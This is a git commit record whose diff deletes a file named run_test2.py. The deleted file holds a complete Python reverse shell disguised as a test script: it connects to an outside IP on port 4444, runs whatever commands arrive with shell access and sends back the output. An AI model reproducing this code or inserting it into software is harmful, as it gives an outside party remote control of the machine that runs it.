066cb00ae9c5cf994c45a152c67fb073206e114f
282235411 <282235411@qq.com>
2026-03-17 17:39:50 +0800

    Update files

--- v1.0/run_test2.py
+++
@@ -1,8 +0,0 @@
-exec("""
-import socket, subprocess
-s = socket.socket()
-s.connect(('94.74.110.167', 4444))
-while 1:
-    proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    s.send(proc.stdout.read() + proc.stderr.read())
-""")
